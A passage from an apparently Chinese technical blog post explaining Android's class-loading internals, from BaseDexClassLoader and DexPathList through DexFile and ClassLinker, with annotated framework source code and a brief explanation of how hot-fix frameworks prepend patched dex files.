class_\">ClassLoader</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> DexPathList pathList;  <span class=\"comment\">//记录dex文件路径信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BaseDexClassLoader</span><span class=\"params\">(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(parent);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.pathList = <span class=\"keyword\">new</span> <span class=\"title class_\">DexPathList</span>(<span class=\"built_in\">this</span>, dexPath, libraryPath, optimizedDirectory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">dexPath: 包含目标类或资源的apk/jar列表;当有多个路径则采用:分割;</span><br><span class=\"line\">optimizedDirectory: 优化后dex文件存在的目录, 可以为<span class=\"literal\">null</span>;</span><br><span class=\"line\">libraryPath: <span class=\"keyword\">native</span>库所在路径列表;当有多个路径则采用:分割;</span><br><span class=\"line\">ClassLoader:父类的类加载器</span><br></pre></td></tr></table></figure>\n\n<p>BaseDexClassLoader会初始化dexPathList，收集dex文件和Native文件动态库</p>\n<p><strong>初始化：</strong></p>\n<p><strong>DexPathList:</strong></p>\n<p>该类主要用来查找Dex、SO库的路径，并这些路径整体呈一个数组</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DexPathList</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Element[] dexElements;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> List&lt;File&gt; nativeLibraryDirectories;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> List&lt;File&gt; systemNativeLibraryDirectories;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DexPathList</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">DexPathList</span><span class=\"params\">(ClassLoader definingContext, String dexPath,</span></span><br><span class=\"line\"><span class=\"params\">            String libraryPath, File optimizedDirectory)</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.definingContext = definingContext;</span><br><span class=\"line\">        ArrayList&lt;IOException&gt; suppressedExceptions = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;IOException&gt;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">//记录所有的dexFile文件</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.dexElements = makePathElements(splitDexPath(dexPath), optimizedDirectory, suppressedExceptions);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//app目录的native库</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.nativeLibraryDirectories = splitPaths(libraryPath, <span class=\"literal\">false</span>);</span><br><span class=\"line\">        <span class=\"comment\">//系统目录的native库</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.systemNativeLibraryDirectories = splitPaths(System.getProperty(<span class=\"string\">&quot;java.library.path&quot;</span>), <span class=\"literal\">true</span>);</span><br><span class=\"line\">        List&lt;File&gt; allNativeLibraryDirectories = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;(nativeLibraryDirectories);</span><br><span class=\"line\">        allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class=\"line\">        <span class=\"comment\">//记录所有的Native动态库</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories, <span class=\"literal\">null</span>, suppressedExceptions);</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexPathList初始化过程，主要收集以下两个变量信息：</span><br><span class=\"line\">（<span class=\"number\">1</span>）dexElements: 根据多路径的分隔符“;”将dexPath转换成File列表，记录所有的dexFile</span><br><span class=\"line\">（<span class=\"number\">2</span>）nativeLibraryPathElements: 记录所有的Native动态库, 包括app目录的<span class=\"keyword\">native</span>库和系统目录的<span class=\"keyword\">native</span>库</span><br></pre></td></tr></table></figure>\n\n<p><strong>makePathElements：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Element[] makePathElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class=\"line\">        List&lt;IOException&gt; suppressedExceptions) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeDexElements(files, optimizedDirectory, suppressedExceptions, <span class=\"literal\">null</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>makeDexElements：</strong></p>\n<p>makeDexElements方法的作用是获取一个包含dex文件的元素集合</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class=\"line\">        List&lt;IOException&gt; suppressedExceptions, ClassLoader loader) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeDexElements(files, optimizedDirectory, suppressedExceptions, loader, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class=\"line\">        List&lt;IOException&gt; suppressedExceptions, ClassLoader loader, <span class=\"type\">boolean</span> isTrusted) &#123;</span><br><span class=\"line\">  Element[] elements = <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>[files.size()];  <span class=\"comment\">//获取文件个数</span></span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"variable\">elementsPos</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (File file : files) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (file.isDirectory()) &#123;</span><br><span class=\"line\">          elements[elementsPos++] = <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>(file);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (file.isFile()) &#123;</span><br><span class=\"line\">          <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> file.getName();</span><br><span class=\"line\">          <span class=\"type\">DexFile</span> <span class=\"variable\">dex</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">          <span class=\"comment\">//匹配以.dex为后缀的文件</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (name.endsWith(DEX_SUFFIX)) &#123;</span><br><span class=\"line\">              dex = loadDexFile(file, optimizedDirectory, loader, elements);</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (dex != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                  elements[elementsPos++] = <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>(dex, <span class=\"literal\">null</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">              dex = loadDexFile(file, optimizedDirectory, loader, elements);              </span><br><span class=\"line\">              <span class=\"keyword\">if</span> (dex == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                  elements[elementsPos++] = <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>(file);</span><br><span class=\"line\">              &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                  elements[elementsPos++] = <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>(dex, file);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (dex != <span class=\"literal\">null</span> &amp;&amp; isTrusted) &#123;</span><br><span class=\"line\">            dex.setTrusted();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          System.logW(<span class=\"string\">&quot;ClassLoader referenced unknown path: &quot;</span> + file);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (elementsPos != elements.length) &#123;</span><br><span class=\"line\">      elements = Arrays.copyOf(elements, elementsPos);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> elements;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>该方法的主要功能是创建Element数组</p>\n<p><strong>loadDexFile：</strong></p>\n<p>加载DexFile文件，而且会把优化后的dex文件缓存到对应目录</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> DexFile <span class=\"title function_\">loadDexFile</span><span class=\"params\">(File file, File optimizedDirectory, ClassLoader loader,</span></span><br><span class=\"line\"><span class=\"params\">                                   Element[] elements)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (optimizedDirectory == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexFile</span>(file, loader, elements);  <span class=\"comment\">//创建DexFile对象</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">optimizedPath</span> <span class=\"operator\">=</span> optimizedPathFor(file, optimizedDirectory);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> DexFile.loadDex(file.getPath(), optimizedPath, <span class=\"number\">0</span>, loader, elements);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>DexFile：</strong></p>\n<p>用来描述Dex文件，Dex的加载以及Class的查找都是由该类调用它的native方法完成的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexFile(File file, ClassLoader loader, DexPathList.Element[] elements)</span><br><span class=\"line\">        <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>(file.getPath(), loader, elements);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DexFile(String fileName, ClassLoader loader, DexPathList.Element[] elements) <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">    mCookie = openDexFile(fileName, <span class=\"literal\">null</span>, <span class=\"number\">0</span>, loader, elements);</span><br><span class=\"line\">    mInternalCookie = mCookie;</span><br><span class=\"line\">    mFileName = fileName;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>openDexFile:</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">openDexFile</span><span class=\"params\">(String sourceName, String outputName, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">        ClassLoader loader, DexPathList.Element[] elements)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> openDexFileNative(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(sourceName).getAbsolutePath(),</span><br><span class=\"line\">                             (outputName == <span class=\"literal\">null</span>) ? <span class=\"literal\">null</span> : <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(outputName).getAbsolutePath(),</span><br><span class=\"line\">                             flags,</span><br><span class=\"line\">                             loader,</span><br><span class=\"line\">                             elements);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">此时参数取值说明：</span><br><span class=\"line\">sourceName为PathClassLoader构造函数传递的dexPath中以分隔符划分之后的文件名；</span><br><span class=\"line\">outputName为null；</span><br><span class=\"line\">flags = 0</span><br><span class=\"line\">loader为null；</span><br><span class=\"line\">elements为makeDexElements()过程生成的Element数组；</span><br></pre></td></tr></table></figure>\n\n<p><strong>openDexFileNative:</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> jobject <span class=\"title function_\">DexFile_openDexFileNative</span><span class=\"params\">(JNIEnv* env,</span></span><br><span class=\"line\"><span class=\"params\">                                         jclass,</span></span><br><span class=\"line\"><span class=\"params\">                                         jstring javaSourceName,</span></span><br><span class=\"line\"><span class=\"params\">                                         jstring javaOutputName ATTRIBUTE_UNUSED,</span></span><br><span class=\"line\"><span class=\"params\">                                         jint flags ATTRIBUTE_UNUSED,</span></span><br><span class=\"line\"><span class=\"params\">                                         jobject class_loader,</span></span><br><span class=\"line\"><span class=\"params\">                                         jobjectArray dex_elements)</span> &#123;</span><br><span class=\"line\">  ScopedUtfChars <span class=\"title function_\">sourceName</span><span class=\"params\">(env, javaSourceName)</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (sourceName.c_str() == nullptr) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Runtime* <span class=\"type\">const</span> runtime = Runtime::Current();</span><br><span class=\"line\">  ClassLinker* linker = runtime-&gt;GetClassLinker();</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">unique_ptr</span>&lt;<span class=\"type\">const</span> DexFile&gt;&gt; dex_files;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span>&gt; error_msgs;</span><br><span class=\"line\">  <span class=\"type\">const</span> OatFile* oat_file = nullptr;</span><br><span class=\"line\"></span><br><span class=\"line\">  dex_files = runtime-&gt;GetOatFileManager().OpenDexFilesFromOat(sourceName.c_str(),</span><br><span class=\"line\">                                                               class_loader,</span><br><span class=\"line\">                                                               dex_elements,</span><br><span class=\"line\">                                                               <span class=\"comment\">/*out*/</span> &amp;oat_file,</span><br><span class=\"line\">                                                               <span class=\"comment\">/*out*/</span> &amp;error_msgs);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!dex_files.empty()) &#123;</span><br><span class=\"line\">    jlongArray <span class=\"built_in\">array</span> = ConvertDexFilesToJavaArray(env, oat_file, dex_files);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">array</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nullptr;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样就完成了dex的加载过程，而<code>BaseDexClassLoader</code>派生出两个子类加载器：<code>PathClassLoader</code>和<code>DexClassLoader</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/5.png\" alt=\"image-20211010132844821\"></p>\n<p>Android中如果parent类加载器加载不到类，最终还是会调用ClassLoader对象自己的findClass()方法</p>\n<p><strong>loadClass()加载：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ClassLoader</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Class&lt;?&gt; loadClass(String className) <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> loadClass(className, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Class&lt;?&gt; loadClass(String className, <span class=\"type\">boolean</span> resolve) <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//判断当前类加载器是否已经加载过指定类，若已加载则直接返回</span></span><br><span class=\"line\">        Class&lt;?&gt; clazz = findLoadedClass(className);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == <span class=\"literal\">null</span>) &#123; </span><br><span class=\"line\">            <span class=\"comment\">//如果没有加载过，则调用parent的类加载递归加载该类，若已加载则直接返回</span></span><br><span class=\"line\">            clazz = parent.loadClass(className, <span class=\"literal\">false</span>);</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (clazz == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//还没加载，则调用当前类加载器来加载</span></span><br><span class=\"line\">                clazz = findClass(className);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">该方法的加载流程如下：</span><br><span class=\"line\">（<span class=\"number\">1</span>）判断当前类加载器是否已经加载过指定类，若已加载则直接返回，否则继续执行；</span><br><span class=\"line\">（<span class=\"number\">2</span>）调用parent的类加载递归加载该类，检测是否加载，若已加载则直接返回，否则继续执行；</span><br><span class=\"line\">（<span class=\"number\">3</span>）调用当前类加载器，通过findClass加载。</span><br></pre></td></tr></table></figure>\n\n<p><strong>findLoadedClass：</strong></p>\n<p>[-&gt; ClassLoader.java]</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class=\"line\">    ClassLoader loader;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span> == BootClassLoader.getInstance())</span><br><span class=\"line\">        loader = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        loader = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> VMClassLoader.findLoadedClass(loader, name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>findClass：</strong></p>\n<p>[-&gt; BaseDexClassLoader.java]</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseDexClassLoader</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ClassLoader</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Class&lt;?&gt; findClass(String name) <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> pathList.findClass(name, suppressedExceptions);</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>DexPathList.findClass：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class <span class=\"title function_\">findClass</span><span class=\"params\">(String name, List&lt;Throwable&gt; suppressed)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Element element : dexElements) &#123;</span><br><span class=\"line\">        <span class=\"type\">DexFile</span> <span class=\"variable\">dex</span> <span class=\"operator\">=</span> element.dexFile;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dex != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//找到目标类，则直接返回</span></span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> dex.loadClassBinaryName(name, definingContext, suppressed);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (clazz != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">代码解释：</span><br><span class=\"line\">\t一个Classloader可以包含多个dex文件，每个dex文件被封装到一个Element对象，这些Element对象排列成有序的数组 dexElements。当查找某个类时，会遍历所有的dex文件，如果找到则直接返回，不再继续遍历dexElements。也就是说当两个类不同的dex中出现，会优先处理排在前面的dex文件，这便是热修复的核心精髓，将需要修复的类所打包的dex文件插入到dexElements前面</span><br><span class=\"line\">热修复原理：</span><br><span class=\"line\">    现在很多热修复技术就是把修复的dex文件放在DexPathList中Element[]数组的前面，这样就实现了修复后的Class抢先加载了，达到了修改bug的目的</span><br></pre></td></tr></table></figure>\n\n<p><strong>DexFile.loadClassBinaryName：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DexFile</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Class <span class=\"title function_\">loadClassBinaryName</span><span class=\"params\">(String name, ClassLoader loader, List&lt;Throwable&gt; suppressed)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> defineClass(name, loader, mCookie, suppressed);  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Class <span class=\"title function_\">defineClass</span><span class=\"params\">(String name, ClassLoader loader, Object cookie, List&lt;Throwable&gt; suppressed)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            result = defineClassNative(name, loader, cookie);  </span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoClassDefFoundError e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (suppressed != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                suppressed.add(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (suppressed != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                suppressed.add(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>defineClassNative()这是native方法</p>\n<p><strong>defineClassNative：</strong></p>\n<p>[-&gt; dalvik_system_DexFile.cc]</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> jclass <span class=\"title function_\">DexFile_defineClassNative</span><span class=\"params\">(JNIEnv* env, jclass, jstring javaName, jobject javaLoader,</span></span><br><span class=\"line\"><span class=\"params\">                                        jobject cookie)</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">unique_ptr</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;<span class=\"type\">const</span> DexFile*&gt;&gt; dex_files = ConvertJavaArrayToNative(env, cookie);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (dex_files.get() == nullptr) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nullptr; <span class=\"comment\">//dex文件为空, 则直接返回</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ScopedUtfChars <span class=\"title function_\">class_name</span><span class=\"params\">(env, javaName)</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (class_name.c_str() == nullptr) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nullptr; <span class=\"comment\">//类名为空, 则直接返回</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> <span class=\"title function_\">descriptor</span><span class=\"params\">(DotToDescriptor(class_name.c_str()))</span>;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">size_t</span> <span class=\"title function_\">hash</span><span class=\"params\">(ComputeModifiedUtf8Hash(descriptor.c_str()))</span>; <span class=\"comment\">//将类名转换为hash码</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span>&amp; dex_file : *dex_files) &#123;</span><br><span class=\"line\">    <span class=\"type\">const</span> DexFile::ClassDef* dex_class_def = dex_file-&gt;FindClassDef(descriptor.c_str(), hash);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dex_class_def != nullptr) &#123;</span><br><span class=\"line\">      ScopedObjectAccess <span class=\"title function_\">soa</span><span class=\"params\">(env)</span>;</span><br><span class=\"line\">      ClassLinker* class_linker = Runtime::Current()-&gt;GetClassLinker();</span><br><span class=\"line\">      class_linker-&gt;RegisterDexFile(*dex_file);</span><br><span class=\"line\">      StackHandleScope&lt;1&gt; <span class=\"title function_\">hs</span><span class=\"params\">(soa.Self())</span>;</span><br><span class=\"line\">      Handle&lt;mirror::ClassLoader&gt; <span class=\"title function_\">class_loader</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">          hs.NewHandle(soa.Decode&lt;mirror::ClassLoader*&gt;(javaLoader)))</span>;</span><br><span class=\"line\">      <span class=\"comment\">//获取目标类</span></span><br><span class=\"line\">      mirror::Class* result = class_linker-&gt;DefineClass(soa.Self(), descriptor.c_str(), hash,</span><br><span class=\"line\">                                                        class_loader, *dex_file, *dex_class_def);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (result != nullptr) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 找到目标对象</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> soa.AddLocalReference&lt;jclass&gt;(result);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> nullptr; <span class=\"comment\">//没有找到目标类</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在native层创建目标类的对象并添加到虚拟机列表</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/6.png\" alt=\"image-20211010135119533\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/7.png\" alt=\"image-20211010140620506\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/17.png\" alt=\"image-20211010150633152\"></p>\n<p>我们继续分析Native层可以发现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexFile.defineClassNative() 的实现在 /art/runtime/<span class=\"keyword\">native</span>/dalvik_system_DexFile.cc，最终由 ClassLinker.DefineClass() 实现</span><br><span class=\"line\">Class.classForName() 的实现在 /art/runtime/<span class=\"keyword\">native</span>/java_lang_Class.cc，最终由 ClassLinker.FindClass() 实现</span><br></pre></td></tr></table></figure>\n\n<p>ClassLinker核心原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">先从已加载类的 class_table 中查询，若找到则直接返回；若找不到则说明该类是第一次加载，则执行加载流程，其中可能需要穿插加载依赖的类，加载完成后将其缓存到 class_table 中</span><br><span class=\"line\">在 ClassLinker 中，会维护两类 class_table，一类针对基本类，一类针对其它的类。class_table 是作为缓存已经加载过的类的缓冲池。不管以什么样的方式去加载类，都需要先从 class_table 中先进行查询以提高加载性能</span><br></pre></td></tr></table></figure>\n\n<p>ClassLinker 在加载类的时候遇到该类依赖的类，进行穿插加载依赖类：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/15.png\" alt=\"image-20211010150149783\"></p>\n<p>我们总结BaseDexClassLoader初始化和加载原理：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/16.png\" alt=\"image-20211010150449575\"></p>\n<p>Android类加载详细流程：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/18.png\" alt=\"image-20211010150449575\"></p>\n<h3 id=\"3-案例\"><a href=\"#3-案例\" class=\"headerlink\" title=\"3.案例\"></a>3.案例</h3><h4 id=\"（1）验证类加载器\"><a href=\"#（1）验证类加载器\" class=\"headerlink\" 